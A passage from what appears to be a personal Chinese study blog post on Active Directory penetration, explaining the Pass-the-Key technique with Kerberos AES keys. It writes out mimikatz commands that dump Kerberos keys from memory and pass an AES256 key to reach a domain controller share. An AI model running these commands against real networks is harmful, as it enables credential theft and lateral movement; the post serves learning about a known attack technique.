<h1 id="PTK：Pass-The-Key（密钥传递攻击）"><a href="#PTK：Pass-The-Key（密钥传递攻击）" class="headerlink" title="PTK：Pass The Key（密钥传递攻击）"></a>PTK：Pass The Key（密钥传递攻击）</h1><h2 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2><p>Kerberos 提供 4 种不同的密钥类型：DES、RC4、AES-128 和 AES-256</p>
<p>启用 RC4 etype 后，可以使用 RC4 密钥。问题是 RC4 密钥实际上是用户的 NT 哈希。使用 NT 散列获取 Kerberos 票证称为pass the hash</p>
<p>禁用 RC4 时，也可以传递其他 Kerberos 密钥（DES、AES-128、AES-256）。这种技术称为ptk。实际上，overpass hash 和 pass key 只是使用的 name 和 key 不同，技术是一样的。</p>
<p>传递的key是AES key，指定使用AES256</p>
<h2 id="PTK攻击的原理及条件"><a href="#PTK攻击的原理及条件" class="headerlink" title="PTK攻击的原理及条件"></a>PTK攻击的原理及条件</h2><p>1、可以在NTLM认证被禁止的情况下用来实现类似PtH的功能</p>
<p>2、需要目标用户帐户的 NTLM 哈希（或密码）</p>
<p>因此，一旦获得用户哈希，就可以为该帐户请求 TGT。最后，可以<strong>访问****用户帐户具有权限的</strong>任何服务或机器。</p>
<h2 id="PTK的各种攻击手法"><a href="#PTK的各种攻击手法" class="headerlink" title="PTK的各种攻击手法"></a>PTK的各种攻击手法</h2><h3 id="一、mimikatz-1"><a href="#一、mimikatz-1" class="headerlink" title="一、mimikatz"></a>一、mimikatz</h3><p>privilege::debug</p>
<p>sekurlsa::ekeys</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308192816206.png" class title="image-20220308192816206">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308193145797.png" class title="image-20220308193145797">

<p>芭比q了这个机器没有aes-256。。</p>
<p>如果有的话在mimikatz输入  sekurlsa::pth &#x2F;user:administrator &#x2F;domain:whoamianony.org &#x2F;aes256:获取到的aes值</p>
<p>然后就可以进行远程连接了，可以进行dir \\DC\c$等操作，其实和pth非常类似</p>
<h3 id="二、impacket工具包"><a href="#二、impacket工具包" class="headerlink" title="二、impacket工具包"></a>二、impacket工具包</h3><p>ptk也有很多impacket脚本使用，使用方法都大同小异，这里太累了就不演示了。</p>
<p>总结：ptt&amp;pth&amp;ptk是域渗透中常见的横向移动与维权方法，之前刚学的时候，都只是大概知道怎么回事，时不时还会弄混，但是自己静下心来好好琢磨了一段时间过后发现其实这三种方法也不是很难，思路一下清晰了很多。对于文章来说的话，有些地方可能有小问题，有些地方还有不知原因的报错。但大体来说比较满意，因为文章只做自己复习学习用。</p>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>chen
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/" title="浅析域渗透的pth&amp;ptt&amp;ptk">https://linus1124-root.github.io/2022/03/06/浅析域渗透的pth-ptt-ptk/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag"># 域渗透</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="prev" title="vulnhub之缓冲区溢出">
                  <i class="fa fa-chevron-left"></i> vulnhub之缓冲区溢出
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" rel="next" title="非约束委派的原理及利用">
                  非约束委派的原理及利用 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">chen</span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  
<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>



  <script src="/js/third-party/fancybox.js"></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
